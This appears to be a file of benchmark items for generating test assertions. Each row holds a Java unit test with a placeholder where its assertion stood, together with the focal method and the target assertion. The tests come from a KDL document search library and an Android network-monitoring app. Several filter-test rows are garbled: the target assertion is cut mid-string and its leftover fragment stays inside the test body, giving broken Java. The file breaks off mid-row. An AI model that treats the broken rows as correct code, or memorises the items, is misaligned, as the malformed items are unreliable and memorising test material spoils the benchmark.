"testListLeafTrim() { final KDLDocument inputDoc = parser.parse(""node1; node2 {node3 {node4;};}""); final PathedSearch search = PathedSearch.builder() .addLevel(predicate1) .addLevel(predicate2) .addLevel(predicate3) .build(); when(predicate1.test(any())).thenReturn(true); when(predicate2.test(any())).thenReturn(true); when(predicate3.test(any())).thenReturn(true);  ""<AssertPlaceHolder>""; verify(predicate1, times(1)).test(argThat(hasId(""node1""))); verify(predicate1, times(1)).test(argThat(hasId(""node2""))); verify(predicate2, times(1)).test(argThat(hasId(""node3""))); verify(predicate3, times(1)).test(argThat(hasId(""node4""))); verifyNoMoreInteractions(predicate1, predicate2, predicate3); }
list(KDLDocument document, boolean trim) { final ArrayList<KDLNode> nodes = new ArrayList<>(); list(document, trim, 0, nodes); return KDLDocument.builder().addNodes(nodes).build(); }"	"assertThat(search.list(inputDoc, true), equalTo(parser.parse(""node4"")))"
"testAnyMatchEmpty() { final KDLDocument inputDoc = KDLDocument.empty(); final PathedSearch search = PathedSearch.builder() .addLevel(predicate1) .build(); when(predicate1.test(any())).thenReturn(true);  ""<AssertPlaceHolder>""; verifyNoInteractions(predicate1); }
anyMatch(KDLDocument document) { return anyMatch(document, 0); }"	assertFalse(search.anyMatch(inputDoc))
"testAnyMatchNothingMatches() { final KDLDocument inputDoc = parser.parse(""node1; node2 {node3;};""); final PathedSearch search = PathedSearch.builder() .addLevel(predicate1) .addLevel(predicate2) .build(); when(predicate1.test(any())).thenReturn(false); when(predicate2.test(any())).thenReturn(false);  ""<AssertPlaceHolder>""; verify(predicate1, times(1)).test(argThat(hasId(""node1""))); verify(predicate1, times(1)).test(argThat(hasId(""node2""))); verifyNoMoreInteractions(predicate1, predicate2); }
anyMatch(KDLDocument document) { return anyMatch(document, 0); }"	assertFalse(search.anyMatch(inputDoc))
"testAnyMatchNothingMatchesAtFirstLevel() { final KDLDocument inputDoc = parser.parse(""node1; node2 {node3;};""); final PathedSearch search = PathedSearch.builder() .addLevel(predicate1) .addLevel(predicate2) .build(); when(predicate1.test(any())).thenReturn(false); when(predicate2.test(any())).thenReturn(true);  ""<AssertPlaceHolder>""; verify(predicate1, times(1)).test(argThat(hasId(""node1""))); verify(predicate1, times(1)).test(argThat(hasId(""node2""))); verifyNoMoreInteractions(predicate1, predicate2); }
anyMatch(KDLDocument document) { return anyMatch(document, 0); }"	assertFalse(search.anyMatch(inputDoc))
"testAnyMatchRoot() { final KDLDocument inputDoc = parser.parse(""node1; node2 {node3;};""); final PathedSearch search = PathedSearch.builder() .addLevel(predicate1) .build(); when(predicate1.test(any())).thenReturn(true);  ""<AssertPlaceHolder>""; verify(predicate1, times(1)).test(argThat(hasId(""node1""))); verifyNoMoreInteractions(predicate1); }
anyMatch(KDLDocument document) { return anyMatch(document, 0); }"	assertTrue(search.anyMatch(inputDoc))
"testAnyMatchBranch() { final KDLDocument inputDoc = parser.parse(""node1 {node2;}; node3 {node4 {node5;};};""); final PathedSearch search = PathedSearch.builder() .addLevel(predicate1) .addLevel(predicate2) .build(); when(predicate1.test(any())).thenReturn(true); when(predicate2.test(any())).thenReturn(false); when(predicate2.test(argThat(hasId(""node4"")))).thenReturn(true);  ""<AssertPlaceHolder>""; verify(predicate1, times(1)).test(argThat(hasId(""node1""))); verify(predicate1, times(1)).test(argThat(hasId(""node3""))); verify(predicate2, times(1)).test(argThat(hasId(""node2""))); verify(predicate2, times(1)).test(argThat(hasId(""node4""))); verifyNoMoreInteractions(predicate1, predicate2); }
anyMatch(KDLDocument document) { return anyMatch(document, 0); }"	assertTrue(search.anyMatch(inputDoc))
"testAnyMatchLeaf() { final KDLDocument inputDoc = parser.parse(""node1 {node2;}; node3 {node4 {node5;};};""); final PathedSearch search = PathedSearch.builder() .addLevel(predicate1) .addLevel(predicate2) .addLevel(predicate3) .build(); when(predicate1.test(any())).thenReturn(true); when(predicate2.test(any())).thenReturn(true); when(predicate3.test(any())).thenReturn(true);  ""<AssertPlaceHolder>""; verify(predicate1, times(1)).test(argThat(hasId(""node1""))); verify(predicate1, times(1)).test(argThat(hasId(""node3""))); verify(predicate2, times(1)).test(argThat(hasId(""node2""))); verify(predicate2, times(1)).test(argThat(hasId(""node4""))); verify(predicate3, times(1)).test(argThat(hasId(""node5""))); verifyNoMoreInteractions(predicate1, predicate2); }
anyMatch(KDLDocument document) { return anyMatch(document, 0); }"	assertTrue(search.anyMatch(inputDoc))
"testFilterEmpty() { final KDLDocument inputDoc = KDLDocument.empty(); final PathedSearch search = PathedSearch.builder() .addLevel(predicate1) .build(); when(predicate1.test(any())).thenReturn(true);  ""<AssertPlaceHolder>""; verifyNoInteractions(predicate1); }
filter(KDLDocument document, boolean trim) { return filter(document, 0, trim).orElse(KDLDocument.empty()); }"	assertThat(search.filter(inputDoc, true), equalTo(KDLDocument.empty()))
"testFilterNothingMatches() { final KDLDocument inputDoc = parser.parse(""node1; node2 {node3;}""); final PathedSearch search = PathedSearch.builder() .addLevel(predicate1) .addLevel(predicate2) .build(); when(predicate1.test(any())).thenReturn(true); when(predicate2.test(any())).thenReturn(false);  ""<AssertPlaceHolder>""; verify(predicate1, times(1)).test(argThat(hasId(""node1""))); verify(predicate1, times(1)).test(argThat(hasId(""node2""))); verify(predicate2, times(1)).test(argThat(hasId(""node3""))); verifyNoMoreInteractions(predicate1, predicate2); }
filter(KDLDocument document, boolean trim) { return filter(document, 0, trim).orElse(KDLDocument.empty()); }"	assertThat(search.filter(inputDoc, true), equalTo(KDLDocument.empty()))
"testFilterEverythingMatches() { final KDLDocument inputDoc = parser.parse(""node1; node2 {node3;}""); final PathedSearch search = PathedSearch.builder() .addLevel(predicate1) .addLevel(predicate2) .build(); when(predicate1.test(any())).thenReturn(true); when(predicate2.test(any())).thenReturn(true);  ""<AssertPlaceHolder>"";}""))); verify(predicate1, times(1)).test(argThat(hasId(""node1""))); verify(predicate1, times(1)).test(argThat(hasId(""node2""))); verify(predicate2, times(1)).test(argThat(hasId(""node3""))); verifyNoMoreInteractions(predicate1, predicate2); }
filter(KDLDocument document, boolean trim) { return filter(document, 0, trim).orElse(KDLDocument.empty()); }"	"assertThat(search.filter(inputDoc, true), equalTo(parser.parse(""node2 {node3"
"testFilterRootMatches() { final KDLDocument inputDoc = parser.parse(""node1; node2 {node3;}""); final PathedSearch search = PathedSearch.builder() .addLevel(predicate1) .build(); when(predicate1.test(any())).thenReturn(true);  ""<AssertPlaceHolder>""; node2""))); verify(predicate1, times(1)).test(argThat(hasId(""node1""))); verify(predicate1, times(1)).test(argThat(hasId(""node2""))); verifyNoMoreInteractions(predicate1, predicate2); }
filter(KDLDocument document, boolean trim) { return filter(document, 0, trim).orElse(KDLDocument.empty()); }"	"assertThat(search.filter(inputDoc, true), equalTo(parser.parse(""node1"
"testFilterBranchMatches() { final KDLDocument inputDoc = parser.parse(""node1; node2 {node3 {node4;};}""); final PathedSearch search = PathedSearch.builder() .addLevel(predicate1) .addLevel(predicate2) .build(); when(predicate1.test(any())).thenReturn(true); when(predicate2.test(any())).thenReturn(true);  ""<AssertPlaceHolder>"";}""))); verify(predicate1, times(1)).test(argThat(hasId(""node1""))); verify(predicate1, times(1)).test(argThat(hasId(""node2""))); verify(predicate2, times(1)).test(argThat(hasId(""node3""))); verifyNoMoreInteractions(predicate1, predicate2); }
filter(KDLDocument document, boolean trim) { return filter(document, 0, trim).orElse(KDLDocument.empty()); }"	"assertThat(search.filter(inputDoc, true), equalTo(parser.parse(""node2 {node3"
"testFilterLeafMatches() { final KDLDocument inputDoc = parser.parse(""node1; node2 {node3 {node4;};}""); final PathedSearch search = PathedSearch.builder() .addLevel(predicate1) .addLevel(predicate2) .addLevel(predicate3) .build(); when(predicate1.test(any())).thenReturn(true); when(predicate2.test(any())).thenReturn(true); when(predicate3.test(any())).thenReturn(true);  ""<AssertPlaceHolder>"";};}""))); verify(predicate1, times(1)).test(argThat(hasId(""node1""))); verify(predicate1, times(1)).test(argThat(hasId(""node2""))); verify(predicate2, times(1)).test(argThat(hasId(""node3""))); verify(predicate3, times(1)).test(argThat(hasId(""node4""))); verifyNoMoreInteractions(predicate1, predicate2, predicate3); }
filter(KDLDocument document, boolean trim) { return filter(document, 0, trim).orElse(KDLDocument.empty()); }"	"assertThat(search.filter(inputDoc, true), equalTo(parser.parse(""node2 {node3 {node4"
"testFilterMultipleLeavesMatch() { final KDLDocument inputDoc = parser.parse(""node1; node2 {node3 {node4;};}; node5 {node6 {node7;};}""); final PathedSearch search = PathedSearch.builder() .addLevel(predicate1) .addLevel(predicate2) .addLevel(predicate3) .build(); when(predicate1.test(any())).thenReturn(true); when(predicate2.test(any())).thenReturn(true); when(predicate3.test(any())).thenReturn(true);  ""<AssertPlaceHolder>"";};}; node5 {node6 {node7;};}""))); verify(predicate1, times(1)).test(argThat(hasId(""node1""))); verify(predicate1, times(1)).test(argThat(hasId(""node2""))); verify(predicate1, times(1)).test(argThat(hasId(""node5""))); verify(predicate2, times(1)).test(argThat(hasId(""node3""))); verify(predicate2, times(1)).test(argThat(hasId(""node6""))); verify(predicate3, times(1)).test(argThat(hasId(""node4""))); verify(predicate3, times(1)).test(argThat(hasId(""node7""))); verifyNoMoreInteractions(predicate1, predicate2, predicate3); }
filter(KDLDocument document, boolean trim) { return filter(document, 0, trim).orElse(KDLDocument.empty()); }"	"assertThat(search.filter(inputDoc, true), equalTo(parser.parse(""node2 {node3 {node4"
"test() { final Search search = new RootSearch();  final KDLDocument inputDoc = parser.parse(input); final Optional<KDLDocument> expected = expectedRaw.map(parser::parse);  KDLDocument output = null; try { if (mutation.isPresent()) { output = search.mutate(inputDoc, mutation.get()); } else { output = search.list(inputDoc, trim); } if (!expected.isPresent()) { fail(String.format(""Expected an error, but got: %s"", output.toKDLPretty(PrintConfig.PRETTY_DEFAULT))); } } catch (Exception e) { if (expected.isPresent()) { throw new RuntimeException(e); } }  Assert.""<AssertPlaceHolder>""; }
list(KDLDocument document, boolean trim) { final ArrayList<KDLNode> nodes = new ArrayList<>(); list(document, trim, nodes); return KDLDocument.builder().addNodes(nodes).build(); }"	assertThat(Optional.ofNullable(output), equalTo(expected))
"test() { final KDLNode inputNode = parser.parse(input).getNodes().get(0); final KDLNode expectedNode = parser.parse(expected).getNodes().get(0);  final Optional<KDLNode> result = mutation.apply(inputNode); ""<AssertPlaceHolder>""; }
apply(KDLNode node) { final KDLNode.Builder builder = node.toBuilder();  for (Map.Entry<Integer, KDLValue<?>> positionalArg : positionalArgs.entrySet()) { builder.insertArgAt(positionalArg.getKey(), positionalArg.getValue()); }  builder.addAllArgs(args); for (String key : props.keySet()) { builder.addProp(key, props.get(key)); }  if (node.getChild().isPresent() && child.isPresent()) { final KDLDocument newChild = node.getChild().get().toBuilder().addNodes(child.get().getNodes()).build(); builder.setChild(newChild); } else { builder.setChild(child); }  return Optional.of(builder.build()); }"	assertThat(result, equalTo(Optional.of(expectedNode)))
"test() { final KDLNode inputNode = parser.parse(input).getNodes().get(0); final KDLNode expectedNode = parser.parse(expected).getNodes().get(0);  final Optional<KDLNode> result = mutation.apply(inputNode); ""<AssertPlaceHolder>""; }
apply(KDLNode node) { final KDLNode.Builder builder = node.toBuilder(); identifier.ifPresent(builder::setIdentifier); child.ifPresent(builder::setChild);  if (!args.isEmpty()) { builder.clearArgs(); }  for (Map.Entry<Integer, KDLValue<?>> positionalArg : positionalArgs.entrySet()) { builder.insertArgAt(positionalArg.getKey(), positionalArg.getValue()); }  builder.addAllArgs(args);  if (!props.isEmpty()) { builder.clearProps(); builder.addAllProps(props); }  return Optional.of(builder.build()); }"	assertThat(result, equalTo(Optional.of(expectedNode)))
"test() { final KDLNode inputNode = parser.parse(input).getNodes().get(0); final Optional<KDLNode> expectedNode = expected.map(ex -> parser.parse(ex).getNodes().get(0));  final Optional<KDLNode> result = mutation.apply(inputNode); ""<AssertPlaceHolder>""; }
apply(KDLNode node) { if (argPredicates.isEmpty() && propPredicates.isEmpty() && positionalArgs.isEmpty() && !emptyChild && !deleteChild) { return Optional.empty(); }  final KDLNode.Builder builder = KDLNode.builder().setIdentifier(node.getIdentifier());  for (int i = 0; i < node.getArgs().size(); i++) { if (!positionalArgs.contains(i)) { boolean matchesAny = false; for (Predicate<KDLValue<?>> argPredicate : argPredicates) { if (argPredicate.test(node.getArgs().get(i))) { matchesAny = true; } }  if (!matchesAny) { builder.addArg(node.getArgs().get(i)); } } }  for (String propKey : node.getProps().keySet()) { final KDLProperty property = new KDLProperty(propKey, node.getProps().get(propKey)); boolean matchesAny = false; for (Predicate<KDLProperty> propPredicate : propPredicates) { matchesAny |= propPredicate.test(property); }  if (!matchesAny) { builder.addProp(property); } }  if (emptyChild && node.getChild().isPresent()) { builder.setChild(KDLDocument.empty()); } else if (!deleteChild) { builder.setChild(node.getChild()); }  return Optional.of(builder.build()); }"	assertThat(result, equalTo(expectedNode))
"testOneMatches() { final KDLNode node = KDLNode.builder().setIdentifier(""identifier"").addArg(""arg"").build(); ""<AssertPlaceHolder>""; }
test(KDLNode node) { for (KDLValue arg : node.getArgs()) { if (predicate.test(arg)) { return true; } }  return false; }"	assertTrue(predicate.test(node))
"testSomeMatch() { final KDLNode node = KDLNode.builder().setIdentifier(""identifier"").addArg(""arg"").addArg(""val"").build(); ""<AssertPlaceHolder>""; }
test(KDLNode node) { for (KDLValue arg : node.getArgs()) { if (predicate.test(arg)) { return true; } }  return false; }"	assertTrue(predicate.test(node))
"testMultipleMatch() { final KDLNode node = KDLNode.builder().setIdentifier(""identifier"").addArg(""arg"").addArg(""arg"").build(); ""<AssertPlaceHolder>""; }
test(KDLNode node) { for (KDLValue arg : node.getArgs()) { if (predicate.test(arg)) { return true; } }  return false; }"	assertTrue(predicate.test(node))
"testNoneMatch() { final KDLNode node = KDLNode.builder().setIdentifier(""identifier"").addArg(""val"").build(); ""<AssertPlaceHolder>"";  }
test(KDLNode node) { for (KDLValue arg : node.getArgs()) { if (predicate.test(arg)) { return true; } }  return false; }"	assertFalse(predicate.test(node))
"testMissingChild() { final ChildPredicate predicate = ChildPredicate.empty(); final KDLNode node = KDLNode.builder().setIdentifier(""node"").build();  ""<AssertPlaceHolder>""; }
test(KDLNode node) { if (!search.isPresent()) { return !node.getChild().isPresent() || node.getChild().get().getNodes().isEmpty(); }  return node.getChild().map(ch -> search.get().anyMatch(ch)).orElse(false); }"	assertTrue(predicate.test(node))
"testEmptyChild() { final ChildPredicate predicate = ChildPredicate.empty(); final KDLNode node = KDLNode.builder().setIdentifier(""node"").setChild(KDLDocument.empty()).build();  ""<AssertPlaceHolder>""; }
test(KDLNode node) { if (!search.isPresent()) { return !node.getChild().isPresent() || node.getChild().get().getNodes().isEmpty(); }  return node.getChild().map(ch -> search.get().anyMatch(ch)).orElse(false); }"	assertTrue(predicate.test(node))
"testChildNotEmpty() { final ChildPredicate predicate = ChildPredicate.empty(); final KDLNode node = KDLNode.builder().setIdentifier(""node"") .setChild(KDLDocument.builder() .addNode(KDLNode.builder().setIdentifier(""identifier"").build()) .build()) .build();  ""<AssertPlaceHolder>""; }
test(KDLNode node) { if (!search.isPresent()) { return !node.getChild().isPresent() || node.getChild().get().getNodes().isEmpty(); }  return node.getChild().map(ch -> search.get().anyMatch(ch)).orElse(false); }"	assertFalse(predicate.test(node))
"testSearchNoChild() { final ChildPredicate predicate = new ChildPredicate(Optional.of(search)); final KDLNode node = KDLNode.builder().setIdentifier(""node"").build();  ""<AssertPlaceHolder>""; Mockito.verifyNoInteractions(search); }
test(KDLNode node) { if (!search.isPresent()) { return !node.getChild().isPresent() || node.getChild().get().getNodes().isEmpty(); }  return node.getChild().map(ch -> search.get().anyMatch(ch)).orElse(false); }"	assertFalse(predicate.test(node))
"testSearchReturnsNothing() { final ChildPredicate predicate = new ChildPredicate(Optional.of(search)); final KDLDocument child = KDLDocument.builder() .addNode(KDLNode.builder().setIdentifier(""identifier"").build()) .build(); final KDLNode node = KDLNode.builder().setIdentifier(""node"") .setChild(child) .build();  when(search.anyMatch(any())).thenReturn(false);  ""<AssertPlaceHolder>""; verify(search, times(1)).anyMatch(eq(child)); verifyNoMoreInteractions(search); }
test(KDLNode node) { if (!search.isPresent()) { return !node.getChild().isPresent() || node.getChild().get().getNodes().isEmpty(); }  return node.getChild().map(ch -> search.get().anyMatch(ch)).orElse(false); }"	assertFalse(predicate.test(node))
"testSearchReturnsSomething() { final ChildPredicate predicate = new ChildPredicate(Optional.of(search)); final KDLDocument child = KDLDocument.builder() .addNode(KDLNode.builder().setIdentifier(""identifier"").build()) .build(); final KDLNode node = KDLNode.builder().setIdentifier(""node"") .setChild(child) .build();  when(search.anyMatch(any())).thenReturn(true);  ""<AssertPlaceHolder>""; verify(search, times(1)).anyMatch(eq(child)); verifyNoMoreInteractions(search); }
test(KDLNode node) { if (!search.isPresent()) { return !node.getChild().isPresent() || node.getChild().get().getNodes().isEmpty(); }  return node.getChild().map(ch -> search.get().anyMatch(ch)).orElse(false); }"	assertTrue(predicate.test(node))
"testShouldMatch() { final KDLNode node = KDLNode.builder().setIdentifier(""identifier"").build(); ""<AssertPlaceHolder>""; }
test(KDLNode node) { return node.getArgs().isEmpty() && node.getProps().isEmpty() && !node.getChild().isPresent(); }"	assertTrue(predicate.test(node))
"testHasArgs() { final KDLNode node = KDLNode.builder() .setIdentifier(""identifier"") .addArg(""o"") .build();  ""<AssertPlaceHolder>""; }
test(KDLNode node) { return node.getArgs().isEmpty() && node.getProps().isEmpty() && !node.getChild().isPresent(); }"	assertFalse(predicate.test(node))
"testHasProps() { final KDLNode node = KDLNode.builder() .setIdentifier(""identifier"") .addProp(""key"", ""val"") .build();  ""<AssertPlaceHolder>""; }
test(KDLNode node) { return node.getArgs().isEmpty() && node.getProps().isEmpty() && !node.getChild().isPresent(); }"	assertFalse(predicate.test(node))
"testHasEmptyChild() { final KDLNode node = KDLNode.builder() .setIdentifier(""identifier"") .setChild(KDLDocument.empty()) .build(); ""<AssertPlaceHolder>""; }
test(KDLNode node) { return node.getArgs().isEmpty() && node.getProps().isEmpty() && !node.getChild().isPresent(); }"	assertFalse(predicate.test(node))
"testHasChild() { final KDLNode node = KDLNode.builder() .setIdentifier(""identifier"") .setChild(KDLDocument.builder() .addNode(KDLNode.builder() .setIdentifier(""identifier"") .build()) .build()) .build(); ""<AssertPlaceHolder>""; }
test(KDLNode node) { return node.getArgs().isEmpty() && node.getProps().isEmpty() && !node.getChild().isPresent(); }"	assertFalse(predicate.test(node))
"testAddFailureCountColumn() { setup.dropNetworkTaskTable(); NetworkTaskDBConstants dbConstants = new NetworkTaskDBConstants(TestRegistry.getContext()); DBOpenHelper.getInstance(TestRegistry.getContext()).getWritableDatabase().execSQL(dbConstants.getCreateTableStatementWithoutFailureCount()); setup.addFailureCountColumnToNetworkTaskTable(); networkTaskDAO.insertNetworkTask(new NetworkTask()); ""<AssertPlaceHolder>""; }
addFailureCountColumnToNetworkTaskTable() { addFailureCountColumnToNetworkTaskTable(DBOpenHelper.getInstance(getContext()).getWritableDatabase()); }"	assertEquals(1, networkTaskDAO.readAllNetworkTasks().size())
"testExportAccessTypeDataForNetworkTask() { NetworkTask task = networkTaskDAO.insertNetworkTask(getNetworkTask1()); AccessTypeData data = getAccessTypeData(task.getId()); accessTypeDataDAO.insertAccessTypeData(data); Map<String, ?> dataMap = setup.exportAccessTypeDataForNetworkTask(task.getId()); ""<AssertPlaceHolder>""; }
exportAccessTypeDataForNetworkTask(long networkTaskId) { Log.d(DBSetup.class.getName(), ""exportAccessTypeDataForNetworkTask, networkTaskId is "" + networkTaskId); AccessTypeDataDAO dao = new AccessTypeDataDAO(getContext()); AccessTypeData accessTypeData = dao.readAccessTypeDataForNetworkTask(networkTaskId); return accessTypeData != null ? accessTypeData.toMap() : null; }"	assertTrue(new AccessTypeData(dataMap).isTechnicallyEqual(getAccessTypeData(task.getId())))
"testInsertResetLastScheduled() { NetworkTask insertedTask1 = getNetworkTask1(); insertedTask1 = networkTaskDAO.insertNetworkTask(insertedTask1); ""<AssertPlaceHolder>""; }
insertNetworkTask(NetworkTask networkTask) { Log.d(NetworkTaskDAO.class.getName(), ""Inserting task "" + networkTask); NetworkTask returnedTask = executeDBOperationInTransaction(networkTask, this::insertNetworkTask); Log.d(NetworkTaskDAO.class.getName(), ""Inserted task is "" + returnedTask); dumpDatabase(""Dump after insertNetworkTask call""); return returnedTask; }"	assertEquals(-1, insertedTask1.getLastScheduled())
"testCreateUniqueSchedulerIdRetryCounterExpired() { NetworkTask task = getNetworkTask(); task = networkTaskDAO.insertNetworkTask(task); TestSchedulerIdGenerator idGenerator = new TestSchedulerIdGenerator(TestRegistry.getContext(), task.getSchedulerId()); SchedulerId schedulerId = idGenerator.createUniqueSchedulerId(db); ""<AssertPlaceHolder>""; }
createUniqueSchedulerId(SQLiteDatabase db) { Log.d(SchedulerIdGenerator.class.getName(), ""createUniqueSchedulerId""); int schedulerId = createSchedulerId(); Log.d(SchedulerIdGenerator.class.getName(), ""Created random scheduler id is "" + schedulerId); int retryCount = getResources().getInteger(R.integer.scheduler_id_retry_count); while (readSchedulerIdCountFromNetworkTaskTable(schedulerId, db) > 0 || readSchedulerIdCountFromSchedulerIdHistory(schedulerId, db) > 0 || isInvalidId(schedulerId)) { Log.d(SchedulerIdGenerator.class.getName(), ""Created random scheduler id exists. Creating new one.""); schedulerId = createSchedulerId(); retryCount--; Log.d(SchedulerIdGenerator.class.getName(), ""Retry count is "" + retryCount); if (retryCount < 0) { Log.d(SchedulerIdGenerator.class.getName(), ""Retry counter expired.""); Log.d(SchedulerIdGenerator.class.getName(), ""Returning invalid result.""); return createSchedulerIdResult(ERROR_SCHEDULER_ID, false); } Log.d(SchedulerIdGenerator.class.getName(), ""Created random scheduler id is "" + schedulerId); } Log.d(SchedulerIdGenerator.class.getName(), ""Created random scheduler id is unique and does not exist.""); SchedulerIdHistoryDBConstants schedulerIdDBConstants = new SchedulerIdHistoryDBConstants(getContext()); Log.d(SchedulerIdGenerator.class.getName(), ""Inserting new scheduler id in "" + schedulerIdDBConstants.getTableName()); if (insertAndDeleteSchedulerIdHistory(schedulerId, db) < 0) { Log.d(SchedulerIdGenerator.class.getName(), ""Error inserting new scheduler in "" + schedulerIdDBConstants.getTableName()); return createSchedulerIdResult(ERROR_SCHEDULER_ID, false); } return createSchedulerIdResult(schedulerId, true); }"	assertFalse(schedulerId.isValid())
"testInitializeNegativeIndex() { NetworkTask task = getNetworkTask(); task.setIndex(-1); NetworkTaskLog.initialize(TestRegistry.getContext(), task); ""<AssertPlaceHolder>""; }
getLogger(Context context, NetworkTask task) { String key = LogUtil.getLogFileKey(context, task); ILogger logger = loggers.get(key); if (logger == null) { initialize(context, task); logger = loggers.get(key); } return logger; }"	assertNull(NetworkTaskLog.getLogger(TestRegistry.getContext(), task))
"testSendMessageNotificationForNetworkTaskWithoutPermission() { permissionManager.setHasPostNotificationsPermission(false); NetworkTask networkTask = getNetworkTask1(); LogEntry logEntry = getLogEntry(new GregorianCalendar(1980, Calendar.MARCH, 17).getTime().getTime(), ""Test"", false); notificationHandler.sendMessageNotificationForNetworkTask(networkTask, logEntry); ""<AssertPlaceHolder>""; }
sendMessageNotificationForNetworkTask(NetworkTask task, LogEntry logEntry) { Log.d(NotificationHandler.class.getName(), ""sendMessageNotification, network task is "" + task + "", log entry is "" + logEntry); if (!permissionManager.hasPostNotificationsPermission(getContext())) { Log.e(NotificationHandler.class.getName(), ""Cannot send notification because of missing permission.""); return; } Notification notification = buildMessageNotificationForNetworkTask(task, logEntry); notificationManager.notify(task.getSchedulerId(), notification); }"	assertFalse(notificationManager.wasNotifyCalled())
"testSendMessageNotificationForegroundStartWithoutPermission() { permissionManager.setHasPostNotificationsPermission(false); notificationHandler.sendMessageNotificationForegroundStart(); ""<AssertPlaceHolder>""; }
sendMessageNotificationForegroundStart() { Log.d(NotificationHandler.class.getName(), ""sendMessageNotificationForegroundStart""); if (!permissionManager.hasPostNotificationsPermission(getContext())) { Log.e(NotificationHandler.class.getName(), ""Cannot send notification because of missing permission.""); return; } Notification notification = buildMessageNotificationForegroundStart(); notificationManager.notify(NOTIFICATION_FOREGROUND_START_ID, notification); }"	assertFalse(notificationManager.wasNotifyCalled())
"testBuildForegroundNotificationWithoutPermission() { permissionManager.setHasPostNotificationsPermission(false); Notification notification = notificationHandler.buildForegroundNotification(); ""<AssertPlaceHolder>""; }
buildForegroundNotification() { Log.d(NotificationHandler.class.getName(), ""buildForegroundNotification""); if (!permissionManager.hasPostNotificationsPermission(getContext())) { Log.e(NotificationHandler.class.getName(), ""Cannot build foreground notification because of missing permission. Returning null.""); return null; } String title = getResources().getString(R.string.notification_title); String text = getResources().getString(R.string.notification_foreground_text); foregroundNotificationBuilder = createForegroundNotificationBuilder(); foregroundNotificationBuilder.setSmallIcon(R.drawable.icon_notification_foreground).setContentTitle(title).setContentText(text).setStyle(new NotificationCompat.BigTextStyle().bigText(text)).setPriority(NotificationCompat.PRIORITY_LOW); if (Build.VERSION.SDK_INT < Build.VERSION_CODES.O) { foregroundNotificationBuilder.setVibrate(null); foregroundNotificationBuilder.setSound(null); } if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) { foregroundNotificationBuilder.setForegroundServiceBehavior(Notification.FOREGROUND_SERVICE_IMMEDIATE); } return foregroundNotificationBuilder.build(); }"	assertNull(notification)
"testExecutionSkippedNetworkTaskDoesNotExist() { NetworkTask task = getNetworkTask(); Intent intent = new Intent(); intent.putExtras(task.toBundle()); broadcastReceiver.onReceive(TestRegistry.getContext(), intent); List<LogEntry> entries = logDAO.readAllLogsForNetworkTask(task.getId()); ""<AssertPlaceHolder>""; }
onReceive(Context context, Intent intent) { NetworkTask task = new NetworkTask(Objects.requireNonNull(intent.getExtras())); Log.d(NetworkTaskProcessBroadcastReceiver.class.getName(), ""Received request for "" + task); boolean synchronous = context.getResources().getBoolean(R.bool.worker_synchronous_execution); boolean addToPool = context.getResources().getBoolean(R.bool.worker_add_to_pool); int wakeLockTimeout = context.getResources().getInteger(R.integer.worker_execution_wakelock_timeout) * 1000; Log.d(NetworkTaskProcessBroadcastReceiver.class.getName(), ""Synchronous execution is "" + synchronous); PowerManager powerManager = (PowerManager) context.getSystemService(Context.POWER_SERVICE); PowerManager.WakeLock wakeLock = null; Log.d(NetworkTaskProcessBroadcastReceiver.class.getName(), ""Creating ExecutorService""); ExecutorService executorService = Executors.newSingleThreadExecutor(); try { Log.d(NetworkTaskProcessBroadcastReceiver.class.getName(), ""Acquiring partial wake lock with a timeout of "" + wakeLockTimeout + "" msec""); wakeLock = Objects.requireNonNull(powerManager).newWakeLock(PowerManager.PARTIAL_WAKE_LOCK, ""KeepItUp:NetworkTaskProcessBroadcastReceiver""); wakeLock.acquire(wakeLockTimeout); TimeBasedSuspensionScheduler timeBasedScheduler = createTimeBasedSuspensionScheduler(context); synchronized (TimeBasedSuspensionScheduler.LOCK) { if (timeBasedScheduler.isRunning()) { Log.d(NetworkTaskProcessBroadcastReceiver.class.getName(), ""Time based scheduler is running.""); if (!timeBasedScheduler.isSuspended()) { Log.d(NetworkTaskProcessBroadcastReceiver.class.getName(), ""Time based scheduler is not suspended.""); executeAndReschedule(context, task, wakeLock, synchronous, addToPool, executorService); } else { Log.d(NetworkTaskProcessBroadcastReceiver.class.getName(), ""Time based scheduler is suspended. Skipping execution and rescheduling.""); } } else { Log.d(NetworkTaskProcessBroadcastReceiver.class.getName(), ""Time based scheduler is not running.""); if (!timeBasedScheduler.isSuspensionActiveAndEnabled()) { Log.d(NetworkTaskProcessBroadcastReceiver.class.getName(), ""Time based scheduler is not active.""); executeAndReschedule(context, task, wakeLock, synchronous, addToPool, executorService); } else { Log.e(NetworkTaskProcessBroadcastReceiver.class.getName(), ""Time based scheduler is not running but is active. Restarting...""); timeBasedScheduler.start(task); } } } } catch (Exception exc) { Log.e(NetworkTaskProcessBroadcastReceiver.class.getName(), ""Error executing worker"", exc); } finally { if (wakeLock != null && synchronous && wakeLock.isHeld()) { Log.d(NetworkTaskProcessBroadcastReceiver.class.getName(), ""Releasing partial wake lock""); wakeLock.release(); } Log.d(NetworkTaskProcessBroadcastReceiver.class.getName(), ""Shutting down ExecutorService""); executorService.shutdown(); } }"	assertEquals(0, entries.size())
"testExecutionSkippedMarkedAsNotRunning() { NetworkTask task = getNetworkTask(); task = networkTaskDAO.insertNetworkTask(task); networkTaskDAO.updateNetworkTaskRunning(task.getId(), false); Intent intent = new Intent(); intent.putExtras(task.toBundle()); broadcastReceiver.onReceive(TestRegistry.getContext(), intent); List<LogEntry> entries = logDAO.readAllLogsForNetworkTask(task.getId()); ""<AssertPlaceHolder>""; }
onReceive(Context context, Intent intent) { NetworkTask task = new NetworkTask(Objects.requireNonNull(intent.getExtras())); Log.d(NetworkTaskProcessBroadcastReceiver.class.getName(), ""Received request for "" + task); boolean synchronous = context.getResources().getBoolean(R.bool.worker_synchronous_execution); boolean addToPool = context.getResources().getBoolean(R.bool.worker_add_to_pool); int wakeLockTimeout = context.getResources().getInteger(R.integer.worker_execution_wakelock_timeout) * 1000; Log.d(NetworkTaskProcessBroadcastReceiver.class.getName(), ""Synchronous execution is "" + synchronous); PowerManager powerManager = (PowerManager) context.getSystemService(Context.POWER_SERVICE); PowerManager.WakeLock wakeLock = null; Log.d(NetworkTaskProcessBroadcastReceiver.class.getName(), ""Creating ExecutorService""); ExecutorService executorService = Executors.newSingleThreadExecutor(); try { Log.d(NetworkTaskProcessBroadcastReceiver.class.getName(), ""Acquiring partial wake lock with a timeout of "" + wakeLockTimeout + "" msec""); wakeLock = Objects.requireNonNull(powerManager).newWakeLock(PowerManager.PARTIAL_WAKE_LOCK, ""KeepItUp:NetworkTaskProcessBroadcastReceiver""); 